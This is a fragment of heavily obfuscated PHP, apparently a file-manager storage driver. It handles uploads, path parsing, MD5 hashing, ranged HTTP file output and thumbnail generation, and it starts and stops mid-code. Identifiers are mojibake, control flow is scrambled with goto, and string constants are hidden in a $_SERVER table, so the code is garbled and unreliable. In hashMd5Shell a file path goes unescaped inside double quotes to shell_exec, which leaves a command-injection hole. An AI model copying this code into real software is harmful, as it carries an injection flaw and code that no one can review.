listAllSimple($F©ü‰ëÏä´) { $eú∞Éœ‚»ı =& $_SERVER[Öíæ€“”≠éÏË]; $déùÁØ »ˆ = array(); $Aô…‘ÿ¿Ò∫ = $this->listAll($F©ü‰ëÏä´); $E∂‹Ÿ—¡§Ò = $this->getPathOuter($F©ü‰ëÏä´); foreach ($Aô…‘ÿ¿Ò∫ as $b“Àª§‚éä) { goto eˆêÒç‘ã; D•ùáÙ‰Ì÷: if (!$b“Àª§‚éä[$eú∞Éœ‚»ı[77]]) { $dœÜÃ£á°«[$eú∞Éœ‚»ı[86]] = $füæ®ï¶—â; } $déùÁØ »ˆ[] = $dœÜÃ£á°«; goto A⁄¯©ü€†—; fÃÙµ¶€ØŒ: $dœÜÃ£á°« = array($eú∞Éœ‚»ı[76] => $d≥Ìê≠ïœ®, $eú∞Éœ‚»ı[77] => $b“Àª§‚éä[$eú∞Éœ‚»ı[77]]); if (isset($b“Àª§‚éä[$eú∞Éœ‚»ı[78]]) && !$b“Àª§‚éä[$eú∞Éœ‚»ı[77]]) { $dœÜÃ£á°«[$eú∞Éœ‚»ı[78]] = $b“Àª§‚éä[$eú∞Éœ‚»ı[78]]; } if (isset($b“Àª§‚éä[$eú∞Éœ‚»ı[84]])) { $dœÜÃ£á°«[$eú∞Éœ‚»ı[84]] = $b“Àª§‚éä[$eú∞Éœ‚»ı[84]]; } goto D•ùáÙ‰Ì÷; eˆêÒç‘ã: $füæ®ï¶—â = $b“Àª§‚éä[$eú∞Éœ‚»ı[76]]; $d≥Ìê≠ïœ® = $b“Àª§‚éä[$eú∞Éœ‚»ı[76]]; if (isset($b“Àª§‚éä[$eú∞Éœ‚»ı[85]])) { $füæ®ï¶—â = $b“Àª§‚éä[$eú∞Éœ‚»ı[85]][$eú∞Éœ‚»ı[76]]; $b“Àª§‚éä[$eú∞Éœ‚»ı[78]] = $b“Àª§‚éä[$eú∞Éœ‚»ı[85]][$eú∞Éœ‚»ı[78]]; $b“Àª§‚éä[$eú∞Éœ‚»ı[84]] = $b“Àª§‚éä[$eú∞Éœ‚»ı[85]][$eú∞Éœ‚»ı[84]]; } else { $d≥Ìê≠ïœ® = substr($b“Àª§‚éä[$eú∞Éœ‚»ı[76]], strlen(get_path_father($E∂‹Ÿ—¡§Ò))); $d≥Ìê≠ïœ® = $eú∞Éœ‚»ı[8] . ltrim($d≥Ìê≠ïœ®, $eú∞Éœ‚»ı[8]); } goto fÃÙµ¶€ØŒ; A⁄¯©ü€†—: } return $déùÁØ »ˆ; } public function upload($A°˜Êè¨Ú≥, $d‡éÓ∫§ÌÏ, $Aª∏≠ä°¶Ö = false, $b Û‹îﬁ∑· = REPEAT_REPLACE) { } public function uploadFileByID($A ÆŸƒ§ö„, $b†ıÏ‰„ãå, $b≤◊ÑÕå°ë) { } public function uploadFileByPath($d¶åÕÏ ©Ê, $B”»§ã÷Ç“, $cíœ›¥±‹ñ = array()) { } public function isUploadServer() { $dË¶‚ïÈŒ» =& $_SERVER[Öíæ€“”≠éÏË]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $dË¶‚ïÈŒ»[87]) { return !0; } return $GLOBALS[$dË¶‚ïÈŒ»[6]][$dË¶‚ïÈŒ»[88]][$dË¶‚ïÈŒ»[89]]; } public function isFileOutServer() { $B™€ã¶éÆò =& $_SERVER[Öíæ€“”≠éÏË]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $B™€ã¶éÆò[87]) { return !0; } return $GLOBALS[$B™€ã¶éÆò[6]][$B™€ã¶éÆò[88]][$B™€ã¶éÆò[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($eÑõ•™åíß) { $c™Ù∫¯‚ñî =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->isCdnHost()) { return $eÑõ•™åíß; } return str_replace(trim(get_url_root($eÑõ•™åíß), $c™Ù∫¯‚ñî[8]), trim($this->cdnHost, $c™Ù∫¯‚ñî[8]), $eÑõ•™åíß); } public function uploadLink($CÏÿç÷âÛá, $a±∂ÿÑ¯¨€ = 0) { goto D◊´πƒ¶ôË; B∂íïÆË¢á: $FÃ»äÃåÑÓ = $a±∂ÿÑ¯¨€ <= $EÑùóüÁπ… ? $FöÖ¯â∞ü˜[91] : $FöÖ¯â∞ü˜[92]; $C∏Îπí‰ÀÁ = (!$a±∂ÿÑ¯¨€ ? 1 : ceil($a±∂ÿÑ¯¨€ / pow(1024, 3))) * 3600 * 4; $eìé¶≤ÑÓ± = $this->{$FÃ»äÃåÑÓ}($CÏÿç÷âÛá, $C∏Îπí‰ÀÁ); goto eŒíÍ¬ÙÿÇ; D◊´πƒ¶ôË: $FöÖ¯â∞ü˜ =& $_SERVER[Öíæ€“”≠éÏË]; if ($this->isUploadServer()) { return; } $b÷¿ÿΩæÉÀ = $this->getType(); goto BπÀá´»ëì; eŒíÍ¬ÙÿÇ: if ($eìé¶≤ÑÓ±) { $eìé¶≤ÑÓ±[$FöÖ¯â∞ü˜[93]] = $CÏÿç÷âÛá; $eìé¶≤ÑÓ±[$FöÖ¯â∞ü˜[94]] = $b÷¿ÿΩæÉÀ; } return $eìé¶≤ÑÓ±; goto FúéöØ±ô⁄; BπÀá´»ëì: if (!in_array($b÷¿ÿΩæÉÀ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $EÑùóüÁπ… = 1024 * 1024 * 10; goto B∂íïÆË¢á; FúéöØ±ô⁄: } public function uploadFormData($CŒ”¢∫Ö¬é, $Eä¶£å«’… = 3600) { } public function multiUploadFormData($D¨ÇéñÀﬁÆ, $f≠∞¥ßÛÌü = 3600) { } public function download($Då‰‘ê¨¶ƒ, $côáè–≥Ô) { } public function ext($Bµñ°ùÌ’„) { $Dº¯’»ˆàô =& $_SERVER[Öíæ€“”≠éÏË]; if (strpos($Bµñ°ùÌ’„, $Dº¯’»ˆàô[8]) === -1) { $eÕô≈çÿ˘° = $Bµñ°ùÌ’„; } else { $eÕô≈çÿ˘° = $this->pathThis($Bµñ°ùÌ’„); } $C°≠ÿ¢»¿â = $Dº¯’»ˆàô[33]; if (strstr($eÕô≈çÿ˘°, $Dº¯’»ˆàô[95])) { $C°≠ÿ¢»¿â = substr($eÕô≈çÿ˘°, strrpos($eÕô≈çÿ˘°, $Dº¯’»ˆàô[95]) + 1); $C°≠ÿ¢»¿â = strtolower($C°≠ÿ¢»¿â); } if (strlen($C°≠ÿ¢»¿â) > 3 && preg_match($Dº¯’»ˆàô[96], $C°≠ÿ¢»¿â, $b†ÂÈ∞î˘¯)) { $C°≠ÿ¢»¿â = $Dº¯’»ˆàô[33]; } return $C°≠ÿ¢»¿â; } public function pathThis($fª¥¶í«èÛ) { $cªá›“»ù’ =& $_SERVER[Öíæ€“”≠éÏË]; $fª¥¶í«èÛ = str_replace($cªá›“»ù’[97], $cªá›“»ù’[8], rtrim($fª¥¶í«èÛ, $cªá›“»ù’[8])); $B‚Íﬂ”»Ñ˘ = strrpos($fª¥¶í«èÛ, $cªá›“»ù’[8]); if ($B‚Íﬂ”»Ñ˘ === !1) { return $fª¥¶í«èÛ; } return substr($fª¥¶í«èÛ, $B‚Íﬂ”»Ñ˘ + 1); } public function pathFather($f‹ú∂à¯≈é) { $BÂıøŒ˘üπ =& $_SERVER[Öíæ€“”≠éÏË]; $f‹ú∂à¯≈é = str_replace($BÂıøŒ˘üπ[97], $BÂıøŒ˘üπ[8], rtrim($f‹ú∂à¯≈é, $BÂıøŒ˘üπ[8])); $aîü≥›ﬁ·õ = strrpos($f‹ú∂à¯≈é, $BÂıøŒ˘üπ[8]); if ($aîü≥›ﬁ·õ === !1) { return $BÂıøŒ˘üπ[33]; } return substr($f‹ú∂à¯≈é, 0, $aîü≥›ﬁ·õ + 1); } public function hashSimple($eôóü‰ìõë) { goto Bïüüãì∫—; C…€Õãì∑¥: $e”Ô”è‹“› = 200; $eÑ•ÓäËà« = 50; if ($eÇﬂïñê˜ñ <= $e”Ô”è‹“› * $eÑ•ÓäËà«) { return $this->hashMd5($eôóü‰ìõë) . $eÇﬂïñê˜ñ; } goto dÚåç¥ó≥ù; F£Ÿ°–“•ì: $Eâ“¿á«äú .= $this->fileSubstr($eôóü‰ìõë, $eÇﬂïñê˜ñ - $e”Ô”è‹“›, $e”Ô”è‹“›); return md5($Eâ“¿á«äú) . $eÇﬂïñê˜ñ; goto eœπß§ÍÛ”; dÚåç¥ó≥ù: $bﬂûπß’Ö… = intval($eÇﬂïñê˜ñ / $eÑ•ÓäËà«); $Eâ“¿á«äú = $FìÊï≠§”®[33]; for ($f›πË—ÃàÖ = 0; $f›πË—ÃàÖ < $eÑ•ÓäËà«; $f›πË—ÃàÖ++) { $Eâ“¿á«äú .= $this->fileSubstr($eôóü‰ìõë, $bﬂûπß’Ö… * $f›πË—ÃàÖ, $e”Ô”è‹“›); } goto F£Ÿ°–“•ì; Bïüüãì∫—: $FìÊï≠§”® =& $_SERVER[Öíæ€“”≠éÏË]; if (!$eôóü‰ìõë) { return md5($FìÊï≠§”®[33]); } $eÇﬂïñê˜ñ = $this->size($eôóü‰ìõë); goto C…€Õãì∑¥; eœπß§ÍÛ”: } public static $md5Cache = array(); public function hashMd5($Cßﬁ¢•˘√à) { $Cßﬁ¢•˘√à = $this->iconvSystem($Cßﬁ¢•˘√à); if (isset(self::$md5Cache[$Cßﬁ¢•˘√à])) { return self::$md5Cache[$Cßﬁ¢•˘√à]; } self::$md5Cache[$Cßﬁ¢•˘√à] = $this->hashMd5Shell($Cßﬁ¢•˘√à); if (!self::$md5Cache[$Cßﬁ¢•˘√à]) { self::$md5Cache[$Cßﬁ¢•˘√à] = @md5_file($Cßﬁ¢•˘√à); } return self::$md5Cache[$Cßﬁ¢•˘√à]; } private function hashMd5Shell($Aß‰à∫°Ñ™) { goto AÊ√∂±¶ù—; AÊ√∂±¶ù—: $c†Óﬂ¯√Óñ =& $_SERVER[Öíæ€“”≠éÏË]; if (!function_exists($c†Óﬂ¯√Óñ[98])) { return !1; } $c›ﬂÜÂ ‡œ = array($c†Óﬂ¯√Óñ[99], $c†Óﬂ¯√Óñ[100]); goto AıçÌ€∞‰Î; cüÁà˜ﬂ≈: $D◊Í™ƒªîª = shell_exec($b˜¡ØàÔá∫ . "\40\x22{$Aß‰à∫°Ñ™}\42"); $D◊Í™ƒªîª = str_replace($c†Óﬂ¯√Óñ[104], $c†Óﬂ¯√Óñ[33], $D◊Í™ƒªîª); return substr($D◊Í™ƒªîª, 0, 32); goto d˘Ãºå‘õø; AıçÌ€∞‰Î: $b˜¡ØàÔá∫ = Cache::get($c†Óﬂ¯√Óñ[101]); if (!$b˜¡ØàÔá∫) { $F‘≠±Ù»ÏÊ = BASIC_PATH . $c†Óﬂ¯√Óñ[102]; $d©Üπü†…‡ = md5_file($F‘≠±Ù»ÏÊ); $b˜¡ØàÔá∫ = $c†Óﬂ¯√Óñ[103]; foreach ($c›ﬂÜÂ ‡œ as $E¥ƒÆµ÷∫å) { $D◊Í™ƒªîª = shell_exec($E¥ƒÆµ÷∫å . "\40\x22{$F‘≠±Ù»ÏÊ}\42"); if ($D◊Í™ƒªîª && substr(trim($D◊Í™ƒªîª), 0, 32) == $d©Üπü†…‡) { $b˜¡ØàÔá∫ = $E¥ƒÆµ÷∫å; break; } } Cache::set($c†Óﬂ¯√Óñ[101], $b˜¡ØàÔá∫, 3600); } if ($b˜¡ØàÔá∫ == $c†Óﬂ¯√Óñ[103]) { return !1; } goto cüÁà˜ﬂ≈; d˘Ãºå‘õø: } public function link($fõ‚’Ñ∞‘Ë) { return $fõ‚’Ñ∞‘Ë; } public function fileOut($fçÂäÏµãü, $F™òé≥Ù»ö = false, $f¿ÀŒ§ ˘ì = false, $dá∞†Çèﬂ∂ = '') { goto b¬∂Ø£ÊÜú; Dãı–˜å§ø: $F«œ∞ÒÌŸÆ = 0; $Fÿ”ÍòÃõÉ = $EÆáŸ„ê∑Û - 1; $E˜«’ë¡åì = $this->ext($AïæÁÙÜ»√); goto aÉê∂œ„ÓŸ; EåÓ¡¬€ƒ‚: $bµûàı‘Øû = strtolower($_SERVER[$f≈∞‘ÕŒä¡[142]]); if ($A´ºœ∞ç‡ô && $bµûàı‘Øû && $d’ë∆†ﬁÈ•) { if (strstr($bµûàı‘Øû, $f≈∞‘ÕŒä¡[143])) { header($f≈∞‘ÕŒä¡[144] . $fçÂäÏµãü); } else { if (strstr($bµûàı‘Øû, $f≈∞‘ÕŒä¡[145])) { header($f≈∞‘ÕŒä¡[146] . $fçÂäÏµãü); } else { if (strstr($bµûàı‘Øû, $f≈∞‘ÕŒä¡[147])) { header($f≈∞‘ÕŒä¡[148] . $fçÂäÏµãü); } } } if ($aµüæ®€ë£) { header($f≈∞‘ÕŒä¡[149] . $aµüæ®€ë£); } return; } if (isset($_SERVER[$f≈∞‘ÕŒä¡[150]])) { if (preg_match($f≈∞‘ÕŒä¡[151], $_SERVER[$f≈∞‘ÕŒä¡[150]], $B¬°¢¡å¥¥)) { $F«œ∞ÒÌŸÆ = intval($B¬°¢¡å¥¥[1]); if (!empty($B¬°¢¡å¥¥[2])) { $Fÿ”ÍòÃõÉ = intval($B¬°¢¡å¥¥[2]); } } header($f≈∞‘ÕŒä¡[152]); header("\103\x6f\x6e\x74\x65\156\x74\x2d\x52\x61\x6e\147\x65\72\40\x62\171\164\x65\x73\40{$F«œ∞ÒÌŸÆ}\55{$Fÿ”ÍòÃõÉ}\57" . $EÆáŸ„ê∑Û); } else { header($f≈∞‘ÕŒä¡[153]); } goto A˘è¶ﬂŒœ≥; A˘è¶ﬂŒœ≥: $E£ØÔ≤ÚñŒ = !0; if ($_SERVER[$f≈∞‘ÕŒä¡[154]] == $f≈∞‘ÕŒä¡[155] && $EÆáŸ„ê∑Û > 1204 * 1024 * 1024 * 2) { $E£ØÔ≤ÚñŒ = !1; } if ($E£ØÔ≤ÚñŒ) { header($f≈∞‘ÕŒä¡[156] . ($Fÿ”ÍòÃõÉ - $F«œ∞ÒÌŸÆ + 1)); } goto DÂé–ﬂ≤ì; A¥ΩÉñ∏≠: $Aø∏ÊåÌÀÆ = $f≈∞‘ÕŒä¡[116] . $Aø∏ÊåÌÀÆ . $f≈∞‘ÕŒä¡[122] . $Aø∏ÊåÌÀÆ; if ($F™òé≥Ù»ö) { header($f≈∞‘ÕŒä¡[123]); header($f≈∞‘ÕŒä¡[124] . $Aø∏ÊåÌÀÆ); } else { header($f≈∞‘ÕŒä¡[125] . $Aø∏ÊåÌÀÆ); } header($f≈∞‘ÕŒä¡[126] . gmdate($f≈∞‘ÕŒä¡[110], time() + 3600 * 24 * 30) . $f≈∞‘ÕŒä¡[127]); goto AÜùÔ’ö§˜; E◊ÊãÈ⁄ÿ‚: $A»≥êèëıÕ = get_file_mime($E˜«’ë¡åì); if (strstr($A»≥êèëıÕ, $f≈∞‘ÕŒä¡[117])) { $A»≥êèëıÕ = $A»≥êèëıÕ . $f≈∞‘ÕŒä¡[118]; } if ($F™òé≥Ù»ö === !1 && !mime_support($A»≥êèëıÕ)) { $F™òé≥Ù»ö = !0; $A»≥êèëıÕ = $f≈∞‘ÕŒä¡[119]; } goto B¿‰”∆ﬂ÷¡; B¿‰”∆ﬂ÷¡: header($f≈∞‘ÕŒä¡[120]); header($f≈∞‘ÕŒä¡[121] . $A»≥êèëıÕ); $Aø∏ÊåÌÀÆ = rawurlencode($AïæÁÙÜ»√); goto A¥ΩÉñ∏≠; aÉê∂œ„ÓŸ: if (in_array($E˜«’ë¡åì, array($f≈∞‘ÕŒä¡[111], $f≈∞‘ÕŒä¡[112], $f≈∞‘ÕŒä¡[113], $f≈∞‘ÕŒä¡[114]))) { $E˜«’ë¡åì = $f≈∞‘ÕŒä¡[115]; } if (!$dá∞†Çèﬂ∂) { $dá∞†Çèﬂ∂ = md5($DîËå≤™™ó . $this->hashSimple($fçÂäÏµãü)); } $dá∞†Çèﬂ∂ = $f≈∞‘ÕŒä¡[116] . $dá∞†Çèﬂ∂ . $f≈∞‘ÕŒä¡[116]; goto E◊ÊãÈ⁄ÿ‚; fË’¥”∑‹Æ: $A´ºœ∞ç‡ô = $this->getType() == $f≈∞‘ÕŒä¡[106]; $d’ë∆†ﬁÈ• = $GLOBALS[$f≈∞‘ÕŒä¡[6]][$f≈∞‘ÕŒä¡[88]][$f≈∞‘ÕŒä¡[107]][$f≈∞‘ÕŒä¡[108]]; $aµüæ®€ë£ = (double) $GLOBALS[$f≈∞‘ÕŒä¡[6]][$f≈∞‘ÕŒä¡[88]][$f≈∞‘ÕŒä¡[107]][$f≈∞‘ÕŒä¡[109]] * 1024 * 1024; goto B°àØæÉ—Ê; AÜùÔ’ö§˜: header($f≈∞‘ÕŒä¡[128]); header($f≈∞‘ÕŒä¡[129]); header($f≈∞‘ÕŒä¡[130]); goto e®Œ©Øöñ€; B°àØæÉ—Ê: @ob_end_clean(); set_timeout(); $a°¥€ÿ“ñü = $this->infoFull($fçÂäÏµãü); goto cà“ïãóâñ; DÂé–ﬂ≤ì: if ($_SERVER[$f≈∞‘ÕŒä¡[157]] == $f≈∞‘ÕŒä¡[158]) { return; } $b◊≠°§¥∞É = 1024 * 100; $Fâé—√ç∞≤ = 0; goto aæö∞ÏàΩı; aæö∞ÏàΩı: if ($aµüæ®€ë£) { $Fâé—√ç∞≤ = intval(1000 * 1000 * ($b◊≠°§¥∞É / $aµüæ®€ë£)); } while ($F«œ∞ÒÌŸÆ <= $Fÿ”ÍòÃõÉ) { $B©¿‹√êˆê = timeFloat(); check_abort(); $a∏ñÂàã⁄ú = $Fÿ”ÍòÃõÉ - $F«œ∞ÒÌŸÆ + 1; if ($a∏ñÂàã⁄ú <= $b◊≠°§¥∞É) { $b◊≠°§¥∞É = $a∏ñÂàã⁄ú; } echo $this->fileSubstr($fçÂäÏµãü, $F«œ∞ÒÌŸÆ, $b◊≠°§¥∞É); $F«œ∞ÒÌŸÆ += $b◊≠°§¥∞É; if ($b◊≠°§¥∞É == $a∏ñÂàã⁄ú) { $F«œ∞ÒÌŸÆ = $Fÿ”ÍòÃõÉ + 1; } if ($Fâé—√ç∞≤) { $aÇÎû•æ¥ë = intval(1000 * 1000 * (timeFloat() - $B©¿‹√êˆê)); $F≥ãÇ¬œˆÏ = $Fâé—√ç∞≤ - $aÇÎû•æ¥ë; if ($F≥ãÇ¬œˆÏ > 5) { usleep($F≥ãÇ¬œˆÏ); } } } goto a™¥Ö◊í‚Õ; bº†Ñò€Í‚: header($f≈∞‘ÕŒä¡[138] . $EÆáŸ„ê∑Û); header($f≈∞‘ÕŒä¡[139]); if (!$F™òé≥Ù»ö && $E˜«’ë¡åì == $f≈∞‘ÕŒä¡[140]) { if ($EÆáŸ„ê∑Û > 1024 * 1024 * 5) { die; } $A≈õ’ Ü–Ô = $this->getContent($fçÂäÏµãü); $A≈õ’ Ü–Ô = Html::clearSVG($A≈õ’ Ü–Ô); header($f≈∞‘ÕŒä¡[141] . strlen($A≈õ’ Ü–Ô)); echo $A≈õ’ Ü–Ô; die; } goto EåÓ¡¬€ƒ‚; b¬∂Ø£ÊÜú: $f≈∞‘ÕŒä¡ =& $_SERVER[Öíæ€“”≠éÏË]; $this->cacheMethod(null, null); if (!$fçÂäÏµãü || !$this->exist($fçÂäÏµãü)) { show_json(LNG($f≈∞‘ÕŒä¡[105]), !1, $f¿ÀŒ§ ˘ì); } goto fË’¥”∑‹Æ; e®Œ©Øöñ€: if (isset($_SERVER[$f≈∞‘ÕŒä¡[131]]) && strtotime($_SERVER[$f≈∞‘ÕŒä¡[131]]) == $a°¥€ÿ“ñü[$f≈∞‘ÕŒä¡[84]]) { header($f≈∞‘ÕŒä¡[132], !0, 304); die; } if (isset($_SERVER[$f≈∞‘ÕŒä¡[133]]) && $_SERVER[$f≈∞‘ÕŒä¡[133]] == $dá∞†Çèﬂ∂) { header($f≈∞‘ÕŒä¡[134] . $dá∞†Çèﬂ∂, !0, 304); die; } header($f≈∞‘ÕŒä¡[134] . $dá∞†Çèﬂ∂); goto fˆ„“≈±‰ê; fˆ„“≈±‰ê: header($f≈∞‘ÕŒä¡[135] . $DîËå≤™™ó . $f≈∞‘ÕŒä¡[127]); header($f≈∞‘ÕŒä¡[136] . $AïæÁÙÜ»√); header($f≈∞‘ÕŒä¡[137]); goto bº†Ñò€Í‚; cà“ïãóâñ: $EÆáŸ„ê∑Û = $a°¥€ÿ“ñü[$f≈∞‘ÕŒä¡[78]]; $DîËå≤™™ó = gmdate($f≈∞‘ÕŒä¡[110], $a°¥€ÿ“ñü[$f≈∞‘ÕŒä¡[84]]); $AïæÁÙÜ»√ = $f¿ÀŒ§ ˘ì ? $f¿ÀŒ§ ˘ì : $this->iconvApp($a°¥€ÿ“ñü[$f≈∞‘ÕŒä¡[28]]); goto Dãı–˜å§ø; a™¥Ö◊í‚Õ: } public function fileOutServer($CÕÊ°π…‹Ó, $eËû‚®ì¢Ë = false, $fá≠‹Ø»À¿ = false, $bõΩç—ˆ•ˆ = '') { $this->fileOut($CÕÊ°π…‹Ó, $eËû‚®ì¢Ë, $fá≠‹Ø»À¿, $bõΩç—ˆ•ˆ); } public function fileOutLink($f⁄Î˘ôÏ¶«) { header($_SERVER[Öíæ€“”≠éÏË][159] . $f⁄Î˘ôÏ¶«); die; } public function cacheMethod($bÉóê£ñµã, $c∂Ç«≠°£Ö, $Eã¯—•ÁÚä = null) { goto BÈÀÏ√Íù®; a‘“Î•–ôç: $d™Ê∞†ç–Ö = $this->{$bÉóê£ñµã}($c∂Ç«≠°£Ö); $Cã…ú⁄îı—[$b¨é®…”ÙÂ] = $d™Ê∞†ç–Ö; return $d™Ê∞†ç–Ö; goto cÙÍ‘â®‹Ç; Bâ‚»‘´⁄ä: if (!is_null($Eã¯—•ÁÚä)) { $Cã…ú⁄îı—[$b¨é®…”ÙÂ] = $Eã¯—•ÁÚä; return; } $d™Ê∞†ç–Ö = isset($Cã…ú⁄îı—[$b¨é®…”ÙÂ]) ? $Cã…ú⁄îı—[$b¨é®…”ÙÂ] : null; if (!is_null($d™Ê∞†ç–Ö)) { return $d™Ê∞†ç–Ö; } goto a‘“Î•–ôç; Aâ≠è™ôÈò: $b¨é®…”ÙÂ = $f“ß£ç¯Ã[160] . $bÉóê£ñµã . $f“ß£ç¯Ã[161] . rtrim($Fú˘êÏù¯›, $f“ß£ç¯Ã[8]); if (is_null($bÉóê£ñµã)) { $Cã…ú⁄îı— = array(); return; } if (is_null($c∂Ç«≠°£Ö)) { unset($Cã…ú⁄îı—[$b¨é®…”ÙÂ]); return; } goto Bâ‚»‘´⁄ä; BÈÀÏ√Íù®: $f“ß£ç¯Ã =& $_SERVER[Öíæ€“”≠éÏË]; static $Cã…ú⁄îı— = array(); $Fú˘êÏù¯› = $c∂Ç«≠°£Ö ? ltrim($this->getPathOuter($c∂Ç«≠°£Ö), $f“ß£ç¯Ã[8]) : $c∂Ç«≠°£Ö; goto Aâ≠è™ôÈò; cÙÍ‘â®‹Ç: } public function fileOutImage($bœ≈ıßîÃ÷, $AªÜƒ¢ÔÑí = 250) { goto bêÇß∏íﬁ´; DïŸ¶„“ÕÎ: $B°éŒ¥™êÓ = "{$d•Ë´è…ÚŸ}\x5f{$AªÜƒ¢ÔÑí}\x2e\x70\156\x67"; if (!($fñà£òãÕ∑ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $cÜóŒΩ≥„ö[172]))) { $D¬ä©Ñÿ‰• = IO::mkdir(IO_PATH_SYSTEM_TEMP . $cÜóŒΩ≥„ö[173]); } else { $D¬ä©Ñÿ‰• = KodIO::make($fñà£òãÕ∑); } if ($fñà£òãÕ∑ = IO::fileNameExist($D¬ä©Ñÿ‰•, $B°éŒ¥™êÓ)) { $Bâ≈è∂«Ö® = KodIO::make($fñà£òãÕ∑); return IO::fileOut($Bâ≈è∂«Ö®, !1, $dˆä©Êùı’); } goto bõËû≈ŒÓì; bõËû≈ŒÓì: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $Bâ≈è∂«Ö® = DATA_THUMB . $B°éŒ¥™êÓ; del_file($Bâ≈è∂«Ö®); goto F§·Óˆä›ü; Dã¯«à◊çé: del_file($Bâ≈è∂«Ö®); IO::fileOut($Dû«Õ∆◊Œ¨); goto c·√î∆Üÿ€; DÁæÉˆú»Œ: if (isset($GLOBALS[$cÜóŒΩ≥„ö[162]]) && $GLOBALS[$cÜóŒΩ≥„ö[162]][$cÜóŒΩ≥„ö[76]] == $dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[76]]) { $bä†≈ª≥µ∏ = $GLOBALS[$cÜóŒΩ≥„ö[162]][$cÜóŒΩ≥„ö[163]]; if (!$dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[164]]) { $dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[164]] = $GLOBALS[$cÜóŒΩ≥„ö[162]]; } if (isset($bä†≈ª≥µ∏[$cÜóŒΩ≥„ö[165]])) { if ($bä†≈ª≥µ∏[$cÜóŒΩ≥„ö[165]] <= $AªÜƒ¢ÔÑí && $bä†≈ª≥µ∏[$cÜóŒΩ≥„ö[166]] <= $AªÜƒ¢ÔÑí) { $Dø£Â‰Ö´ß = !0; } } $dˆä©Êùı’ = $dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[164]][$cÜóŒΩ≥„ö[28]]; } if ($dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[78]] <= 1024 * 50 || $Dø£Â‰Ö´ß || !function_exists($cÜóŒΩ≥„ö[167]) || $dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[168]] == $cÜóŒΩ≥„ö[169]) { return $this->fileOut($bœ≈ıßîÃ÷, !1, $dˆä©Êùı’); } if (isset($dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[164]][$cÜóŒΩ≥„ö[170]])) { $d•Ë´è…ÚŸ = $dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[164]][$cÜóŒΩ≥„ö[170]]; } else { if (isset($dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[164]][$cÜóŒΩ≥„ö[171]])) { $d•Ë´è…ÚŸ = $dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[164]][$cÜóŒΩ≥„ö[171]]; } else { $d•Ë´è…ÚŸ = md5("{$dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[28]]}\x5f{$dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[76]]}\137{$dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[78]]}"); } } goto DïŸ¶„“ÕÎ; F§·Óˆä›ü: if (!@file_exists($Bâ≈è∂«Ö®)) { $d¨Èˆÿ◊€ﬁ = TEMP_FILES; if (!is_dir($d¨Èˆÿ◊€ﬁ)) { mk_dir($d¨Èˆÿ◊€ﬁ); } $Cïùº≈≠„∆ = $d¨Èˆÿ◊€ﬁ . $d•Ë´è…ÚŸ . $cÜóŒΩ≥„ö[95] . $dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[168]]; if (!@file_exists($Cïùº≈≠„∆)) { $Cïùº≈≠„∆ = $this->download($bœ≈ıßîÃ÷, $Cïùº≈≠„∆); } ImageThumb::createThumb($Cïùº≈≠„∆, $Bâ≈è∂«Ö®, $AªÜƒ¢ÔÑí, $AªÜƒ¢ÔÑí * 10); } if (!file_exists($Bâ≈è∂«Ö®) || filesize($Bâ≈è∂«Ö®) < 100) { return @file_exists($Cïùº≈≠„∆) ? IO::fileOut($Cïùº≈≠„∆) : $this->fileOut($bœ≈ıßîÃ÷); } if (!($Dû«Õ∆◊Œ¨ = IO::move($Bâ≈è∂«Ö®, $D¬ä©Ñÿ‰•))) { return IO::fileOut($Bâ≈è∂«Ö®); } goto Dã¯«à◊çé; C≠ÙéÒ¿çÏ: $dà√¶âÑ…Ø = $this->info($bœ≈ıßîÃ÷); $dˆä©Êùı’ = $dà√¶âÑ…Ø[$cÜóŒΩ≥„ö[28]]; $Dø£Â‰Ö´ß = !1; goto DÁæÉˆú»Œ; bêÇß∏íﬁ´: $cÜóŒΩ≥„ö =& $_SERVER[Öíæ€“”≠éÏË]; set_timeout(); if (substr($bœ≈ıßîÃ÷, 0, 4) == $cÜóŒΩ≥„ö[147]) { $this->fileOutLink($bœ≈ıßîÃ÷); } goto C≠ÙéÒ¿çÏ; c·√î∆Üÿ€: } public function fileOutImageServer($eéıÓ…∫Î„, $A•çëˆòÕæ = 250) { $this->fileOutImage($eéıÓ…∫Î„, $A•çëˆòÕæ); } public function fileNameAuto($DÇƒ™Ωäåè, $añêå¶ıÌ , $d¥õ†“¿Ó = REPEAT_RENAME, $bﬁﬂÊÎ‹ßó = false) { goto dŸ‚É•ÏÇº; Dü•´´ûøı: while ($this->exist(rtrim($DÇƒ™Ωäåè, $Aˆ¨≠Ûó∑—[8]) . $Aˆ¨≠Ûó∑—[8] . $aËé≥˜êíî)) { $aËé≥˜êíî = $d≈›èÎòÖ¶ . "\50{$d’âπß•Ø}\51{$aèñ∑ä”ı}"; $d’âπß•Ø++; } return $aËé≥˜êíî; goto B≥à†áú∑¯; eµú¬é¿óè: if ($d¥õ†“¿Ó == REPEAT_SKIP) { return !1; } $aèñ∑ä”ı = $Aˆ¨≠Ûó∑—[95] . get_path_ext($añêå¶ıÌ ); $aèñ∑ä”ı = $aèñ∑ä”ı == $Aˆ¨≠Ûó∑—[95] || $bﬁﬂÊÎ‹ßó ? $Aˆ¨≠Ûó∑—[33] : $aèñ∑ä”ı; goto FãâÈﬂËÒó; dŸ‚É•ÏÇº: $Aˆ¨≠Ûó∑— =& $_SERVER[Öíæ€“”≠éÏË]; $AÏ∫Ÿ∫¯∑Ω = $DÇƒ™Ωäåè === $Aˆ¨≠Ûó∑—[33] ? 